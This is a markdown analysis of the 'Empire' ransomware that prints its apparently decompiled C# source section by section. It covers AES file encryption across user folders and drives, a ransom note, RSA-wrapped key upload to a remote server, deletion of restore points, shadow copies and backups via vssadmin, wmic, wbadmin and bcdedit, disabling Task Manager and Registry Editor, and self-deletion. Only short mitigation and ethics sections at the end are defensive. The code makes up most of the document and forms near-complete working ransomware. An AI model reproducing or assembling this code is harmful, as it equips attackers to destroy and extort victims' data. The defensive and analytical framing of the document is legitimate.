# Empire Ransomware Analysis 🕵️‍♂️

This document analyzes the "Empire" ransomware, a malicious C# program designed to encrypt files, demand payment for decryption, and evade recovery or detection. Each key component is explained and illustrated with the relevant source code from the provided program. The analysis is for educational and defensive purposes only. 🚨

---

## 1. Encryption Process 🔒

The ransomware encrypts files using AES-256 in CBC mode, with a randomly generated 50-character password and a 16-byte cryptographic salt. It targets specific file extensions, encrypts files in parallel, and appends a ".emp" extension to encrypted files. The encryption key is derived using PBKDF2 with 1000 iterations for added security.

### Password Generation
The `CreatePassword` method generates a random 50-character password using a mix of alphanumeric and special characters.

```csharp
private static string CreatePassword(int length)
{
    StringBuilder stringBuilder = new StringBuilder();
    Random random = new Random();
    while (0 < Math.Max(Interlocked.Decrement(ref length), length + 1))
    {
        stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
    }
    return stringBuilder.ToString();
}
```

### Salt Generation
The `GenerateSalt` method creates a 16-byte cryptographic salt using `RNGCryptoServiceProvider`.

```csharp
public static void GenerateSalt()
{
    try
    {
        using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
        saltBytes = new byte[16];
        rNGCryptoServiceProvider.GetBytes(saltBytes);
        salti = string.Join(",", saltBytes);
    }
    catch
    {
    }
}
```

### AES Encryption
The `AES_Enc` method performs AES-256 encryption in CBC mode, using the password and salt to derive the key and IV via PBKDF2.

```csharp
private static byte[] AES_Enc(byte[] bytesToBeEncrypted, byte[] passwordBytes)
{
    byte[] array = null;
    using MemoryStream memoryStream = new MemoryStream();
    using RijndaelManaged rijndaelManaged = new RijndaelManaged();
    rijndaelManaged.KeySize = 256;
    rijndaelManaged.BlockSize = 128;
    Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
    rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes((int)((double)rijndaelManaged.KeySize / 8.0));
    rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes((int)((double)rijndaelManaged.BlockSize / 8.0));
    rijndaelManaged.Mode = CipherMode.CBC;
    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
    {
        cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
        cryptoStream.Close();
    }
    return memoryStream.ToArray();
}
```

### File Encryption
The `EncryptFile` method reads a file, encrypts its contents, and renames it with the ".emp" extension. It skips system-critical files and logs encrypted files.

```csharp
private static void EncryptFile(string file, string password)
{
    try
    {
        if (file != Process.GetCurrentProcess().MainModule.FileName && file != Application.StartupPath && file != Directory.GetCurrentDirectory() && !file.ToLower().Contains(Environment.GetFolderPath(Environment.SpecialFolder.System).ToLower().Replace("system32", null)))
        {
            byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
            byte[] bytes = Encoding.UTF8.GetBytes(password);
            bytes = SHA256.Create().ComputeHash(bytes);
            byte[] bytes2 = AES_Enc(bytesToBeEncrypted, bytes);
            File.WriteAllBytes(file, bytes2);
            File.Move(file, file + extension);
            Logs.Append(file + Environment.NewLine);
        }
    }
    catch
    {
    }
}
```

### Directory Traversal
The `encryptDirectory` method recursively scans directories, encrypting files with specified extensions in parallel (up to 10 files and 5 directories concurrently).

```csharp
private static void encryptDirectory(string location, string password)
{
    try
    {
        string validExtensions = ".txt" + ".TXT" + ".jar" + ".exe" + ".dat" + ".contact" + ".settings" + ".doc" + ".docx" + ".xls" + ".xlsx" + ".ppt" + ".pptx" + ".odt" + ".jpg" + ".png" + ".jpeg" + ".gif" + ".csv" + ".py" + ".sql" + ".mdb" + ".sln" + ".php" + ".asp" + ".aspx" + ".html" + ".htm" + ".css" + ".md" + ".rtf" + ".yaml" + ".conf" + ".json5" + ".xml" + ".psd" + ".pdf" + ".dll" + ".c" + ".cs" + ".vb" + ".vbs" + ".p12" + ".mp3" + ".mp4" + ".f3d" + ".dwg" + ".cpp" + ".h" + ".chm" + ".chw" + ".msi" + ".zip" + ".rar" + ".mov" + ".rtf" + ".bmp" + ".mkv" + ".avi" + ".apk" + ".lnk" + ".iso" + ".7z" + ".ace" + ".arj" + ".bz2" + ".cab" + ".gzip" + ".gz" + ".tgz" + ".tar.gz" + ".tbz2" + ".tar.bz2" + ".txz" + ".tar.xz" + ".bkf" + ".tar.zip" + ".tar.7z" + ".tib" + ".gho" + ".bak" + ".ab" + ".vbk" + ".scr" + ".fbl" + ".dmp" + ".tmp" + ".wps" + ".com" + ".bat" + ".cmd" + ".msp" + ".cpl" + ".ps1" + ".vbs" + ".js" + ".ws pud" + ".cmdx" + ".lzh" + ".tar" + ".uue" + ".xz" + ".z" + ".001" + ".mpeg" + ".mp3" + ".mpg" + ".core" + ".crproj" + ".pdb" + ".ico" + ".pas" + ".db" + ".torrent" + ".sqlite" + ".mysql" + ".dbf" + ".json" + ".postgresql" + ".oracle" + ".nosql" + ".wim" + ".cur" + ".sdb" + ".xsd" + "" + ".mui" + ".log" + ".rsm";
        string[] files = Directory.GetFiles(location);
        string[] directories = Directory.GetDirectories(location);
        ParallelOptions parallelOptions = new ParallelOptions
        {
            MaxDegreeOfParallelism = 10
        };
        Parallel.ForEach(files, parallelOptions, delegate(string file)
        {
            string text = Path.GetExtension(file);
            if (validExtensions.Contains(text.ToLower()) && text != extension)
            {
                EncryptFile(file, password);
            }
        });
        ParallelOptions parallelOptions2 = new ParallelOptions
        {
            MaxDegreeOfParallelism = 5
        };
        Parallel.ForEach(directories, parallelOptions2, delegate(string directory)
        {
            encryptDirectory(directory, password);
        });
    }
    catch
    {
    }
}
```

### Targeted Directories
The ransomware encrypts files in the user profile (`UserFold`), fixed drives (`Fix_Drivers`), and removable drives (`OtherDrivers`), excluding the system drive's root.

```csharp
private static void UserFold(string password)
{
    try
    {
        encryptDirectory(userfolder, password);
    }
    catch
    {
    }
}

private static void Fix_Drivers(string password)
{
    string[] logicalDrives = Environment.GetLogicalDrives();
    foreach (string text in logicalDrives)
    {
        DriveInfo driveInfo = new DriveInfo(text);
        if (driveInfo.DriveType == DriveType.Fixed && !driveInfo.ToString().Contains(C_DIR))
        {
            try
            {
                encryptDirectory(text, password);
            }
            catch
            {
            }
        }
    }
}

private static void OtherDrivers(string password)
{
    string[] logicalDrives = Environment.GetLogicalDrives();
    foreach (string text in logicalDrives)
    {
        DriveInfo driveInfo = new DriveInfo(text);
        if (driveInfo.DriveType != DriveType.Fixed && !driveInfo.ToString().Contains(C_DIR))
        {
            try
            {
                encryptDirectory(text, password);
            }
            catch
            {
            }
        }
    }
}
```

---

## 2. Ransom Note 📜

The ransomware creates a file named `HOW-TO-DECRYPT.txt` on the desktop, containing instructions for contacting the attacker, the victim's HWID, and a list of encrypted files. The note is automatically opened after creation.

### Code
The `WriteMessage` method generates and displays the ransom note.

```csharp
private static void WriteMessage()
{
    try
    {
        string text = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW-TO-DECRYPT.txt";
        string text2 = Mynote + Environment.NewLine + "Your ID is [" + hwid + "]";
        File.WriteAllText(text, text2 + Environment.NewLine + Environment.NewLine + "[[Encrypted Files]]" + Environment.NewLine + Logs.ToString());
        Process.Start(text);
    }
    catch
    {
    }
}
```

### Ransom Note Content
The note is defined in the `Mynote` field and appended with the HWID and encrypted file list.

```csharp
public static string Mynote = "Empire welcomes you!\r\n--------------------\r\nAll your files are securely encrypted by our software.\r\nUnfortunately, nothing will be restored without our key and decryptor.\r\nIn this regard, we suggest you buy our decryptor to recover your information.\r\nTo communicate, use the Telegram bot at this link\r\n\n" + urltgbot + "\r\n\nIf the bot is unavailable, then write to the reserve email address: " + mail + "\r\n\r\nThere you will receive an up-to-date contact for personal communication.\r\n--------------------\r\n\r\nDo not try to recover files yourself, they may break and we will not be able to return them, also try not to turn off your computer until decryption.";
```

---

## 3. Key Transmission 🌐

The encryption password and salt are encrypted with RSA using a hardcoded public key and sent to a remote server via HTTP POST. The victim's HWID is included for identification. After transmission, the local password is cleared.

### Code
The `SendPassword` method handles RSA encryption and key transmission.

```csharp
public static void SendPassword(string password, string hwid, string salt)
{
    try
    {
        string value;
        string value2;
        using (RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider())
        {
            rSACryptoServiceProvider.FromXmlString(publickey);
            value = Convert.ToBase64String(rSACryptoServiceProvider.Encrypt(Encoding.UTF8.GetBytes(password), fOAEP: false));
            value2 = Convert.ToBase64String(rSACryptoServiceProvider.Encrypt(Encoding.UTF8.GetBytes(salt), fOAEP: false));
        }
        string address = gate1;
        using WebClient webClient = new WebClient();
        NameValueCollection data = new NameValueCollection
        {
            { "Password", value },
            { "Hwid", hwid },
            { "Salt", value2 }
        };
        byte[] bytes = webClient.UploadValues(address, "POST", data);
        Encoding.UTF8.GetString(bytes);
    }
    catch
    {
    }
}
```

### RSA Public Key
The hardcoded RSA public key used for encrypting the password and salt.

```csharp
public static string publickey = "<RSAKeyValue><Modulus>7raY9jQP+Z0yh/yAnuy39gCHVtsr+6+nTIc6V3x+iu/5D1mfF9kTmF7sbe09kKvwxum3whfWguO5jjpz0awTtMb0Px+ot87tdAQwrifP8IYtBfdhHVJLGKTGDKR0g4HGCq1Piuui0NahHO+hHxgw91jri1O6DwPlNvUsAX1h/c47T0qFzJVOYTlqKYiHDzP0aSpAZw73kR33vq80q87H+A12SDWQY5a7sjIOaRKEoIPxbVvyu2n/2p5HvR+D/sCu+wdT2jslCKdhJGVmm3BNO/SW1XnvLDNoaZoCaeFi0AG7fK+K7SN//vS8Ru11fEpNHP1JmsYX0IN1J4znu2lOzQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
```

---

## 4. Anti-Recovery Measures 🛡️

The ransomware disables system recovery mechanisms by deleting restore points, shadow copies, and backups, and modifying boot settings to prevent restoration.

### Delete Restore Points
The `DeleteRestorePoints` method removes all system restore points using the `SRRemoveRestorePoint` API.

```csharp
[DllImport("Srclient.dll")]
public static extern int SRRemoveRestorePoint(int index);

private static void DeleteRestorePoints()
{
    try
    {
        ManagementObjectEnumerator enumerator = new ManagementClass("\\\\.\\root\\default", "systemrestore", new ObjectGetOptions()).GetInstances().GetEnumerator();
        try
        {
            while (enumerator.MoveNext())
            {
                ManagementObject val = (ManagementObject)enumerator.Current;
                try
                {
                    SRRemoveRestorePoint(int.Parse(((ManagementBaseObject)val)["sequencenumber"].ToString()));
                }
                catch
                {
                }
            }
        }
        finally
        {
            ((IDisposable)enumerator)?.Dispose();
        }
    }
    catch
    {
    }
}
```

### Delete Shadow Copies
The `Shadow.DelCopy` method deletes Volume Shadow Copies using WMI and commands like `vssadmin delete shadows /all /quiet`.

```csharp
internal class Shadow
{
    public static void DelCopy()
    {
        try
        {
            ManagementScope val = new ManagementScope("\\\\.\\root\\cimv2");
            SelectQuery val2 = new SelectQuery("SELECT * FROM Win32_ShadowCopy");
            ManagementObjectSearcher val3 = new ManagementObjectSearcher(val, (ObjectQuery)(object)val2);
            try
            {
                ManagementObjectCollection val4 = val3.Get();
                if (val4.Count > 0)
                {
                    ManagementObjectEnumerator enumerator = val4.GetEnumerator();
                    try
                    {
                        while (enumerator.MoveNext())
                        {
                            ManagementObject val5 = (ManagementObject)enumerator.Current;
                            try
                            {
                                ManagementBaseObject methodParameters = val5.GetMethodParameters("Delete");
                                val5.InvokeMethod("Delete", methodParameters, (InvokeMethodOptions)null);
                            }
                            catch
                            {
                            }
                        }
                    }
                    finally
                    {
                        ((IDisposable)enumerator)?.Dispose();
                    }
                }
            }
            finally
            {
                ((IDisposable)val3)?.Dispose();
            }
        }
        catch
        {
        }
        try
        {
            Process process = new Process();
            process.StartInfo.FileName = "vssadmin.exe";
            process.StartInfo.Arguments = "delete shadows /all /quiet";
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.Start();
        }
        catch
        {
        }
        try
        {
            Process process2 = new Process();
            process2.StartInfo.FileName = "wbadmin.exe";
            process2.StartInfo.Arguments = "DELETE SYSTEMSTATEBACKUP";
            process2.StartInfo.UseShellExecute = false;
            process2.StartInfo.CreateNoWindow = true;
            process2.Start();
        }
        catch
        {
        }
        try
        {
            Process process3 = new Process();
            process3.StartInfo.FileName = "wbadmin.exe";
            process3.StartInfo.Arguments = "DELETE SYSTEMSTATEBACKUP -deleteOldest";
            process3.StartInfo.UseShellExecute = false;
            process3.StartInfo.CreateNoWindow = true;
            process3.Start();
        }
        catch
        {
        }
        ExecuteCommand("cmd.exe", "/c vssadmin delete shadows /all /quiet");
        ExecuteCommand("cmd.exe", "/c wmic shadowcopy delete");
        ExecuteCommand("cmd.exe", "/c bcdedit /set {default} bootstatuspolicy ignoreallfailures");
        ExecuteCommand("cmd.exe", "/c bcdedit /set {default} recoveryenabled no");
        ExecuteCommand("cmd.exe", "/c wbadmin delete catalog -quiet");
    }

    private static void ExecuteCommand(string command, string arguments)
    {
        try
        {
            Process process = new Process();
            process.StartInfo = new ProcessStartInfo
            {
                FileName = command,
                Arguments = arguments,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            process.Start();
        }
        catch
        {
        }
    }
}
```

### Disable System Tools
The `DisableTSK.DisableRegEdit` method disables Task Manager and Registry Editor by modifying registry keys.

```csharp
internal class DisableTSK
{
    public static async void DisableRegEdit()
    {
        await Task.Run(delegate
        {
            try
            {
                RegistryKey? obj = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true) ?? Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                obj.SetValue("DisableTaskMgr", 1);
                obj.Close();
            }
            catch
            {
            }
            try
            {
                RegistryKey? obj3 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true) ?? Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
                obj3.SetValue("DisableRegistryTools", 1);
                obj3.Close();
            }
            catch
            {
            }
        });
    }
}
```

---

## 5. Persistence and Evasion 🕵️

The ransomware ensures only one instance runs, deletes itself after execution, and uses extensive error handling to continue running despite failures.

### Mutex
The `CreateMutex` and `CloseMutex` methods use a mutex to prevent multiple instances.

```csharp
public static bool CreateMutex()
{
    currentApp = new Mutex(initiallyOwned: false, mutex, out var createdNew);
    return createdNew;
}

public static void CloseMutex()
{
    if (currentApp != null)
    {
        currentApp.Close();
        currentApp = null;
    }
}
```

### Self-Deletion
The `SDel` method deletes the ransomware executable after a delay using a `cmd.exe` command.

```csharp
public static void SDel(string delay)
{
    try
    {
        ProcessStartInfo processStartInfo = new ProcessStartInfo();
        processStartInfo.Arguments = "/C choice /C Y /N /D Y /T " + delay + " & Del \"" + new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name + "\"";
        processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
        processStartInfo.CreateNoWindow = true;
        processStartInfo.FileName = "cmd.exe";
        Process.Start(processStartInfo);
    }
    catch
    {
    }
}
```

---

## 6. Hardware ID (HWID) 🖥️

The ransomware generates a unique identifier for the victim's system using an MD5 hash of system properties, included in the ransom note and key transmission.

### Code
The `Hwid` class generates the HWID.

```csharp
internal class Hwid
{
    public static string HWID()
    {
        try
        {
            return GetHash(Environment.CurrentManagedThreadId + Environment.UserName + Environment.MachineName + Environment.OSVersion.VersionString + Environment.SystemPageSize);
        }
        catch
        {
            return "Error HWID";
        }
    }

    public static string GetHash(string strToHash)
    {
        using MD5 mD = MD5.Create();
        byte[] bytes = Encoding.UTF8.GetBytes(strToHash);
        return BitConverter.ToString(mD.ComputeHash(bytes), 0, 10).Replace("-", "").ToUpper();
    }
}
```

---

## Execution Flow ⚙️

The `Run` method orchestrates the ransomware's operations.

```csharp
private static void Run()
{
    try
    {
        password = CreatePassword(50);
        GenerateSalt();
        hwid = Hwid.HWID();
        SendPassword(password, hwid, salti);
        DisableTSK.DisableRegEdit();
        UserFold(password);
        Fix_Drivers(password);
        OtherDrivers(password);
        password = null;
        WriteMessage();
        DeleteRestorePoints();
        Shadow.DelCopy();
        SDel("1");
    }
    catch
    {
    }
}
```

---

## Mitigation and Response 🛠️

1. **Isolate the System**: Disconnect from the network to prevent further communication with the attacker's server.
2. **Do Not Pay**: Payment does not guarantee decryption and funds criminal activity.
3. **Forensic Analysis**: Preserve the ransom note and logs for investigation.
4. **Recovery**: Restore from offline backups; decryption without the attacker's key is nearly impossible.
5. **Prevention**: Use antivirus, keep systems patched, and educate users.
6. **Report**: Contact law enforcement or cybersecurity authorities.

---

## Ethical and Legal Note ⚖️

This analysis is for educational and defensive purposes to understand ransomware behavior and improve cybersecurity. Distributing or using this code maliciously is illegal and unethical.